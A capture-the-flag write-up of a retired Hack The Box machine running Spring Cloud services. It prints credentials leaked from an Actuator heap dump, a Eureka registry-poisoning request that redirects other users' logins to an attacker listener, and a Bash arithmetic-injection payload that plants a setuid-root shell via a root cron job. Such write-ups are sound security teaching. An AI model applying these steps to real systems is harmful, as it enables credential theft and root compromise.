# Eureka — Hack The Box write-up

> Difficulty: **Hard**. Machine is **retired** — this write-up is publishable.
> Flags are redacted.

A Spring Cloud microservices box: an unauthenticated Actuator heap dump leaks
credentials, the Eureka service registry can be poisoned to steal a second
user's login, and a root-scheduled Bash log analyser is vulnerable to
arithmetic-context command injection.

## Recon

Two ports of interest: `22` (OpenSSH) and `80` (nginx → redirects to
`furni.htb`). A full sweep added `8761/tcp` — the default **Eureka** service
registry port, and the first strong signal that this is a Spring Cloud estate.

The site at `furni.htb` is a Spring Boot app (its Spring Security response
headers give it away). Probing `/actuator/` returned a full endpoint index:
`env`, `beans`, `mappings`, `heapdump`, `loggers`, `refresh`, `sessions`,
`serviceregistry`, and more — all unauthenticated for reads.

## Foothold: heap dump → credentials → SSH

`GET /actuator/env` masks sensitive values (`******`), but `GET
/actuator/heapdump` hands over the raw JVM heap. Pulling the 77 MB dump and
running `strings` over it recovered two credential pairs:

- the datasource login, from `{password=0sc@r190_S0l!dP@sswd, user=oscar190}`
- the Eureka HTTP Basic login `EurekaSrvr:0scarPWDisTheB3st`

A subtle trap: in the heap, string values are followed by a delimiter byte that
prints as `!`. The datasource password is `0sc@r190_S0l!dP@sswd` — **not**
`…dP@sswd!`. Carrying that trailing delimiter into an SSH attempt produces a
clean "permission denied" and sends you down the wrong path. With the correct
value, `ssh oscar190@…` lands the foothold.

## Lateral movement: Eureka poisoning → a second user

On the box, `ss -ltnp` shows the real architecture: a Spring Cloud **Gateway**,
a **USER-MANAGEMENT-SERVICE**, the **Furni** web app, Eureka, and MySQL — most
bound to localhost. Eureka (`8761`) is reachable, and the leaked Basic creds let
you both read and **write** the registry.

The gateway routes `/login` to the `USER-MANAGEMENT-SERVICE` VIP and
load-balances across whatever instances are registered for it. An automated
process logs in through the gateway periodically. By registering a **rogue
instance** for that service that points back at our own listener, the gateway's
round-robin sends some of those logins to us — leaking the plaintext
credentials of `miranda.wise@furni.htb`.

```
POST /eureka/apps/USER-MANAGEMENT-SERVICE   (HTTP Basic: EurekaSrvr:…)
  { "instance": { "app":"USER-MANAGEMENT-SERVICE",
                  "ipAddr":"<attacker>", "port":{"$":<port>,"@enabled":"true"},
                  "vipAddress":"USER-MANAGEMENT-SERVICE", "status":"UP", … } }
```

Catch the request on a plain HTTP listener and read the `username`/`password`
form body. That password is reused as the Unix password for user
`miranda-wise` (note the hyphen) → `ssh miranda-wise@…` → **user.txt**.

## Privilege escalation: arithmetic-context command injection in a root cron

`miranda-wise` belongs to group `developers`. A root cron runs
`/opt/log_analyse.sh` about once a minute against
`/var/www/web/cloud-gateway/log/application.log`, and that log directory is
group-`developers`-writable.

The script buckets HTTP status codes:

```bash
code=$(echo "$line" | grep -oP 'Status: \K.*')
...
if [[ "$existing_code" -eq "$code" ]]; then ...
```

The `-eq` operator forces **arithmetic evaluation** of both operands, and Bash
performs command substitution while evaluating an arithmetic expression. Because
`$code` is lifted verbatim from a log line, a crafted entry whose status field
is `a[$(command)]` makes root run `command`:

```
… LoggingFilter : HTTP GET /x - Status: a[$(cp /bin/bash /var/tmp/.rb;chmod 4755 /var/tmp/.rb; … )]
```

Place that line in `application.log` (the directory is writable, so recreate the
file with the line appended), wait for the next run, and a setuid-root shell
appears:

```
/var/tmp/.rb -p -c 'id'  →  euid=0(root)
```

→ **root.txt**.

Note: `logrotate` runs at 00:00 and will rotate the log away, so time the
injection outside that window (or simply re-inject) and the cron catches it
within ~a minute.

## Lessons

- **A trailing punctuation mark on a secret pulled from a heap/strings dump may
  be a serializer delimiter, not part of the value.** Try the secret both with
  and without it before concluding the credential is wrong.
- **A writable service registry is a credential-interception primitive**, not
  just a discovery nuisance: if a load balancer trusts registry entries, you can
  insert yourself into the request path.
- **`[[ "$a" -eq "$b" ]]` on untrusted input is command injection** — the
  numeric comparison operators evaluate their operands in arithmetic context.

## One fix that breaks it earliest

Lock down Actuator: never expose `heapdump`, restrict the web exposure to
`health`/`info`, and require authentication on a dedicated management port.
